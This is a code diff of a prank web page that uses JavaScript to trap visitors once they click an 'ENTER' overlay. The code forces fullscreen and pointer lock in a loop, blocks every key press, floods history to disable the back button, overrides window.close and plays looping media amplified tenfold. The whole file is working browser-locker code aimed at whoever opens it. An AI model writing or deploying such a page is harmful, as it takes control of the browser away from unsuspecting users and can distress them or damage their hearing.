@@ -125,8 +125,9 @@ body, html {
 </head>
 <body>
 
-<div class="click-overlay">
-    <button onclick="forceFullscreenAndPlay()">ENTER</button>
+<!-- Click anywhere on overlay to start (button is just visual) -->
+<div class="click-overlay" id="startOverlay">
+    <button>ENTER</button>
 </div>
 <div class="black-screen"></div>
 
@@ -153,105 +154,64 @@ body, html {
     const ORIGINAL_WIDTH = 640;
     const ORIGINAL_HEIGHT = 480;
 
-    // --- AGGRESSIVE KEYBOARD LOCKDOWN ---
-    // Block all key combinations that could exit or close the window
-    document.addEventListener('keydown', function(e) {
-        // Block F11 (fullscreen toggle)
-        if (e.key === 'F11') {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }
-        // Block Alt+F4 (close window) — may not work in all browsers but we try
-        if (e.altKey && e.key === 'F4') {
-            e.preventDefault();
-            e.stopPropagation();
-            // Re-engage fullscreen and pointer lock
-            attemptFullscreen();
-            document.body.requestPointerLock();
-            return false;
-        }
-        // Block Ctrl+W (close tab)
-        if (e.ctrlKey && e.key === 'w') {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }
-        // Block Ctrl+Q (quit browser on some systems)
-        if (e.ctrlKey && e.key === 'q') {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }
-        // Block Ctrl+Shift+W (close window)
-        if (e.ctrlKey && e.shiftKey && e.key === 'W') {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }
-        // Block Alt+Tab? not possible, but we can try to refocus
-        // Block Esc (often exits fullscreen)
-        if (e.key === 'Escape') {
-            e.preventDefault();
-            e.stopPropagation();
-            attemptFullscreen(); // force back
-            return false;
-        }
-        // Block any other potential escape keys
-        e.preventDefault();
-        e.stopPropagation();
-        return false;
-    }, true);
+    // --- AUDIO BOOST (Web Audio API) ---
+    let audioContext;
+    let gainNode;
+    const mediaElements = [];
 
-    // --- FULLSCREEN LOCK: Re-enter immediately if user exits ---
-    document.addEventListener('fullscreenchange', () => {
-        if (!document.fullscreenElement && hasTriggered) {
-            attemptFullscreen();
-        }
-    });
-    document.addEventListener('webkitfullscreenchange', () => {
-        if (!document.webkitFullscreenElement && hasTriggered) {
-            attemptFullscreen();
-        }
-    });
-    document.addEventListener('mozfullscreenchange', () => {
-        if (!document.mozFullScreenElement && hasTriggered) {
-            attemptFullscreen();
-        }
-    });
-    document.addEventListener('MSFullscreenChange', () => {
-        if (!document.msFullscreenElement && hasTriggered) {
-            attemptFullscreen();
-        }
-    });
+    function initAudioBoost() {
+        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        gainNode = audioContext.createGain();
+        gainNode.gain.value = 10; // 10x volume (maximum loudness, may distort)
+        gainNode.connect(audioContext.destination);
 
-    // --- VISIBILITY LOCK: If tab becomes hidden, try to bring it back (limited) ---
-    document.addEventListener('visibilitychange', () => {
-        if (document.hidden && hasTriggered) {
-            // Attempt to refocus by opening a dummy pop-under? Not reliable.
-            // Instead, we just force fullscreen again when visible.
-        }
-    });
+        // Connect all audio elements
+        const audioIds = ['shart', 'shart2', 'shart3'];
+        audioIds.forEach(id => {
+            const el = document.getElementById(id);
+            if (el) {
+                mediaElements.push(el);
+                const source = audioContext.createMediaElementSource(el);
+                source.connect(gainNode);
+                el.loop = true;
+                el.muted = false;
+            }
+        });
 
-    // --- NAVIGATION LOCK: Flood history to break back button ---
-    function floodHistory() {
-        for (let i = 0; i < 20; i++) {
-            history.pushState(null, null, location.href);
-        }
+        // Connect video elements if they have audio tracks
+        const videoIds = ['fart', 'ronnie'];
+        videoIds.forEach(id => {
+            const el = document.getElementById(id);
+            if (el) {
+                mediaElements.push(el);
+                const source = audioContext.createMediaElementSource(el);
+                source.connect(gainNode);
+                el.loop = true;
+                el.muted = false;
+            }
+        });
     }
-    
-    window.onpopstate = function() {
-        floodHistory();
-        // Also re-engage fullscreen
-        attemptFullscreen();
-    };
 
-    // --- WINDOW CLOSE CONFIRMATION (makes it annoying to close) ---
-    window.onbeforeunload = function() {
-        return "Are you absolutely sure you want to leave?";
-    };
+    function playAllMedia() {
+        if (audioContext && audioContext.state === 'suspended') {
+            audioContext.resume();
+        }
+        mediaElements.forEach(m => {
+            if (m) {
+                m.volume = 1.0; // fallback
+                m.muted = false;
+                const playPromise = m.play();
+                if (playPromise !== undefined) {
+                    playPromise.catch(() => {
+                        // Retry forever
+                        setInterval(() => m.play(), 100);
+                    });
+                }
+            }
+        });
+    }
 
-    // --- FULLSCREEN REQUEST FUNCTION (aggressive) ---
+    // --- FULLSCREEN LOCK (aggressive) ---
     function attemptFullscreen() {
         const elem = document.documentElement;
         if (elem.requestFullscreen) elem.requestFullscreen();
@@ -260,85 +220,49 @@ body, html {
         else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
     }
 
-    // --- POINTER LOCK (keeps mouse trapped) ---
+    // --- POINTER LOCK (trap mouse) ---
     function lockPointer() {
         if (document.body.requestPointerLock) {
             document.body.requestPointerLock();
         }
     }
 
-    // --- AUDIO BOOST using Web Audio API (volume > 1.0) ---
-    let audioContext;
-    let gainNode;
-    const audioElements = [];
-
-    function initAudioBoost() {
-        // Create AudioContext (must be resumed after user gesture)
-        audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        gainNode = audioContext.createGain();
-        gainNode.gain.value = 10; // 10x volume (may distort, but it's LOUD)
-        gainNode.connect(audioContext.destination);
-
-        // Connect each audio element to the gain node
-        const audioIds = ['shart', 'shart2', 'shart3'];
-        audioIds.forEach(id => {
-            const el = document.getElementById(id);
-            if (el) {
-                audioElements.push(el);
-                // Create media element source
-                const source = audioContext.createMediaElementSource(el);
-                source.connect(gainNode);
-                // Ensure it loops and unmuted
-                el.loop = true;
-                el.muted = false;
-                // Note: source must be connected before play()
-            }
-        });
-
-        // Also handle video elements if they have audio tracks
-        const videoIds = ['fart', 'ronnie'];
-        videoIds.forEach(id => {
-            const el = document.getElementById(id);
-            if (el) {
-                audioElements.push(el);
-                const source = audioContext.createMediaElementSource(el);
-                source.connect(gainNode);
-                el.loop = true;
-                el.muted = false;
-            }
-        });
-    }
-
-    // --- PLAY ALL MEDIA AT MAX VOLUME ---
-    function playAllMedia() {
-        // Resume AudioContext if suspended
-        if (audioContext && audioContext.state === 'suspended') {
-            audioContext.resume();
+    // --- HISTORY FLOOD (disable back) ---
+    function floodHistory() {
+        for (let i = 0; i < 20; i++) {
+            history.pushState(null, null, location.href);
         }
-
-        // Play all audio/video elements
-        audioElements.forEach(m => {
-            if (m) {
-                m.volume = 1.0; // fallback
-                m.muted = false;
-                const playPromise = m.play();
-                if (playPromise !== undefined) {
-                    playPromise.catch(() => {
-                        // Retry loop if browser blocks autoplay
-                        setInterval(() => m.play(), 100);
-                    });
-                }
-            }
-        });
     }
 
-    // --- MAIN ENTRY POINT ---
-    window.forceFullscreenAndPlay = function() {
-        if (hasTriggered) return; // prevent double execution
+    // --- KEY BLOCKING (prevent all escape shortcuts) ---
+    function blockKeys(e) {
+        // Block ALL key combinations — user cannot press anything
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }
+
+    // --- RE-ENGAGE LOCKS on any user activity ---
+    function reengageLocks() {
+        if (hasTriggered) {
+            // If not in fullscreen, request it
+            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
+                attemptFullscreen();
+            }
+            // If pointer not locked, lock it
+            if (!document.pointerLockElement) {
+                lockPointer();
+            }
+        }
+    }
+
+    // --- START FUNCTION (called when overlay clicked) ---
+    window.startExperience = function() {
+        if (hasTriggered) return;
         hasTriggered = true;
 
-        // Hide overlays
-        const overlay = document.querySelector('.click-overlay');
+        // Hide overlay and black screen
+        const overlay = document.getElementById('startOverlay');
         const blackScreen = document.querySelector('.black-screen');
         if (overlay) overlay.style.display = 'none';
         if (blackScreen) blackScreen.style.display = 'none';
@@ -346,25 +270,69 @@ body, html {
         // Flood history
         floodHistory();
 
-        // Initialize audio boost (must be called after user interaction)
+        // Initialize audio boost (requires user gesture)
         initAudioBoost();
 
         // Play all media
         playAllMedia();
 
-        // Aggressive fullscreen loop (every 500ms)
+        // Initial locks
         attemptFullscreen();
-        setInterval(attemptFullscreen, 500);
-
-        // Pointer lock loop
         lockPointer();
-        setInterval(lockPointer, 500);
 
-        // Also attempt to lock on any click
-        document.addEventListener('click', lockPointer);
+        // Set up periodic re-engagement (every 200ms)
+        setInterval(reengageLocks, 200);
+
+        // Also re-engage on any user interaction (mouse move, click, key, touch)
+        const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
+        events.forEach(eventType => {
+            document.addEventListener(eventType, reengageLocks, true);
+        });
+
+        // Additional fullscreen change detection
+        document.addEventListener('fullscreenchange', reengageLocks);
+        document.addEventListener('webkitfullscreenchange', reengageLocks);
+        document.addEventListener('mozfullscreenchange', reengageLocks);
+        document.addEventListener('MSFullscreenChange', reengageLocks);
+
+        // Pointer lock change detection
+        document.addEventListener('pointerlockchange', reengageLocks);
+        document.addEventListener('mozpointerlockchange', reengageLocks);
+        document.addEventListener('webkitpointerlockchange', reengageLocks);
+
+        // Block all keys permanently (after start)
+        document.addEventListener('keydown', blockKeys, true);
+        document.addEventListener('keyup', blockKeys, true);
+        document.addEventListener('keypress', blockKeys, true);
     };
 
-    // --- RESIZE LOGIC (unchanged) ---
+    // --- Attach start to overlay click (anywhere on overlay) ---
+    document.getElementById('startOverlay').addEventListener('click', startExperience);
+
+    // --- Initial passive blocks (before start) ---
+    document.addEventListener('contextmenu', e => e.preventDefault(), true);
+    document.addEventListener('dragstart', e => e.preventDefault(), true);
+    document.addEventListener('selectstart', e => e.preventDefault(), true);
+
+    // --- Window close confirmation ---
+    window.onbeforeunload = function() {
+        return "Are you absolutely sure you want to leave?";
+    };
+
+    // --- Override window.close (just in case) ---
+    window.close = function() {
+        console.warn('Nice try.');
+    };
+
+    // --- History popstate trap ---
+    window.onpopstate = function() {
+        if (hasTriggered) {
+            floodHistory();
+            reengageLocks();
+        }
+    };
+
+    // --- Resize logic (unchanged) ---
     function resizeVideos() {
         const videoContainer = document.querySelector('.video-container');
         if (videoContainer) {
@@ -377,34 +345,6 @@ body, html {
         resizeVideos();
         setInterval(resizeVideos, 2000);
     });
-
-    // --- ADDITIONAL TRAPS ---
-    // Disable context menu (already there)
-    document.addEventListener('contextmenu', e => e.preventDefault(), true);
-
-    // Block drag events (sometimes used to exit)
-    document.addEventListener('dragstart', e => e.preventDefault(), true);
-
-    // Block selection attempts
-    document.addEventListener('selectstart', e => e.preventDefault(), true);
-
-    // If the user somehow manages to click on a link (none exist), but still
-    document.addEventListener('click', e => {
-        if (hasTriggered) {
-            e.preventDefault();
-            e.stopPropagation();
-            attemptFullscreen();
-            lockPointer();
-        }
-    }, true);
-
-    // Prevent window blur from allowing escape? Not possible.
-    // But we can re-request focus when window loses focus? Not allowed.
-
-    // Override window.close to prevent scripted closing
-    window.close = function() {
-        console.warn('Nice try.');
-    };
 
 })();
 </script>
